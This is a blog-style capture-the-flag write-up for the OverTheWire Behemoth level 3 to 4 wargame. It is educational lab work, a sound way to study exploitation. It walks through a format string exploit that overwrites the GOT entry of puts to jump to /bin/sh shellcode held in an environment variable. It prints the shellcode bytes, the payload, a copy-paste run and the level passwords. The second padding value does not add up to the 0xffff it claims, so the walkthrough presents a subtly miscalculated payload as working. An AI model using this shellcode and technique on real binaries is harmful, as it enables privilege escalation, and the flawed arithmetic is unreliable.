---
date: 2023-09-01 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Behemoth Level 3 → 4 tutorial!!"
permalink: /posts/overTheWire-Behemoth-Level-3-to-4/
tags: [overthewire, behemoth, exploitation, format-string, GOT-overwrite, priv-esc, walkthrough, ctf, linux, beginner]
description: "A full step-by-step detailed write-up for OverTheWire Behemoth Level 3 → 4!!"
---

<!-- Scoped styles -->
<style>
  .behemoth-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .behemoth-nav .nav-left,.behemoth-nav .nav-center,.behemoth-nav .nav-right{flex:1}
  .behemoth-nav .nav-left{text-align:left}
  .behemoth-nav .nav-center{text-align:center}
  .behemoth-nav .nav-right{text-align:right}
  .behemoth-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .behemoth-nav a:hover{transform:translateY(-1px)}
  .behemoth-nav .disabled{opacity:.55}
  :root[data-theme='light'] .behemoth-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="behemoth-nav" aria-label="Behemoth level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Behemoth-Level-2-to-3/' | relative_url }}">← Previous: Level 2 → 3</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/behemoth/behemoth4.html" target="_blank" rel="noopener">
      Official (Level 4) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Behemoth-Level-4-to-5/' | relative_url }}">Next: Level 4 → 5 →</a>
  </div>
</nav>

## Login

Log in as **behemoth3** using the password from Level 2 → 3.

```bash
ssh behemoth3@behemoth.labs.overthewire.org -p 2221
# password: nietiediel
````

---

## Task

The binary **`/behemoth/behemoth3`** is vulnerable to a **format string attack**.
Our goal: exploit it to redirect execution into our shellcode and escalate to **behemoth4**.

---

## A little bit of Theory

* **Format string vulnerability**: happens when user input is passed directly to `printf()` instead of `printf("%s", input)`.
* With `%x`, we can dump stack values.
* With `%n`, we can **write** to arbitrary memory addresses.
* By overwriting a **Global Offset Table (GOT)** entry (like `puts@GOT`), we can redirect program flow.
* Combine with **shellcode in an environment variable** → we gain a shell.

**Tools we’ll use**:

* `objdump -R` → list GOT entries
* `gdb` → debugging / testing
* a helper `/tmp/find_addr` → leak env var addresses

---

## Solution

### 1. Run the binary to observe behavior

```bash
cd /behemoth
./behemoth3
Identify yourself: test
Welcome, test
aaand goodbye again.
```

👉 Nothing suspicious at first glance. Let’s try format specifiers:

```bash
./behemoth3
Identify yourself: %x.%x.%x
Welcome, 80485c0.8048330.bffff4a8
aaand goodbye again.
```

**Explanation:** The binary printed out raw stack values. ✅ This confirms a format string bug.

---

### 2. Locate GOT entry of `puts`

```bash
objdump -R behemoth3 | grep puts
```

Output:

```
080497ac R_386_JUMP_SLOT  puts@GLIBC_2.0
```

👉 GOT entry for `puts` is at **0x080497ac**.
If we overwrite this address with our shellcode address, when the program calls `puts`, it will jump into our code.

---

### 3. Prepare shellcode in an environment variable

Classic Linux x86 execve("/bin/sh") shellcode:

```bash
export SHELLCODE=$(python -c 'print(20*"\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')
```

* `20*"\x90"` → NOP sled to increase landing zone.
* The rest is the shellcode that spawns `/bin/sh`.

---

### 4. Find the runtime address of \$SHELLCODE

Compile helper:

```c
// /tmp/find_addr.c
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char *argv[]) {
    printf("%s is at %p\n", argv[1], getenv(argv[1]));
    return 0;
}
```

```bash
gcc -m32 /tmp/find_addr.c -o /tmp/find_addr
/tmp/find_addr SHELLCODE
```

Example output:

```
SHELLCODE is at 0xffffde75
```

👉 That’s the address we’ll redirect execution to.

---

### 5. Craft format string exploit

We want to overwrite `0x080497ac` with `0xffffde75`.
Trick: break it into **two 16-bit chunks** because `%hn` writes half-words.

* Lower 2 bytes: `0xde75` (56949 decimal)
* Upper 2 bytes: `0xffff` (65535 decimal)

We’ll place the GOT address twice on the stack (`\xac\x97\x04\x08` and `\xae\x97\x04\x08`), then use `%hn` to write values in order.

Payload example:

```bash
(python -c 'print("\xac\x97\x04\x08" + "\xae\x97\x04\x08" + "%56941x%1$hn%8594x%2$hn")' | ./behemoth3)
```

**Explanation:**

* First `%hn` writes 0xde75 into lower half of GOT address.
* Second `%hn` writes 0xffff into upper half.
* GOT entry now points to our shellcode.

---

### 6. Trigger the exploit

If successful, when the program tries to call `puts()`, it will instead jump into our `$SHELLCODE`:

```bash
whoami
# behemoth4
cat /etc/behemoth_pass/behemoth4
```

Output:

```
ietheishei
```

🎉 That’s the next password.

---

## Password

```
ietheishei
```

---

## Troubleshooting

* **Segfault before shell** → Adjust padding values (`%xxxxxx`) until they align exactly.
* **Wrong GOT entry** → Double-check with `objdump -R behemoth3`.
* **Different env address** → Re-run `/tmp/find_addr SHELLCODE`, addresses shift slightly.
* **Forgot little endian** → Always write GOT addresses as `\xac\x97\x04\x08`.
* **Use `%hn` not `%n`** → `%n` writes full 32-bit, likely to crash.

---

## Copy-paste quick run

```bash
ssh behemoth3@behemoth.labs.overthewire.org -p 2221

# 1. Set shellcode
export SHELLCODE=$(python -c 'print(20*"\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')

# 2. Leak its address
/tmp/find_addr SHELLCODE
# Example: 0xffffde75

# 3. Exploit
cd /behemoth
(python -c 'print("\xac\x97\x04\x08" + "\xae\x97\x04\x08" + "%56941x%1$hn%8594x%2$hn")' | ./behemoth3)

# 4. Get shell & password
whoami
cat /etc/behemoth_pass/behemoth4
```

---

**Congrats 🎉** You just exploited a **format string bug**, overwrote the GOT entry of `puts` with your shellcode address, and escalated to **behemoth4**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})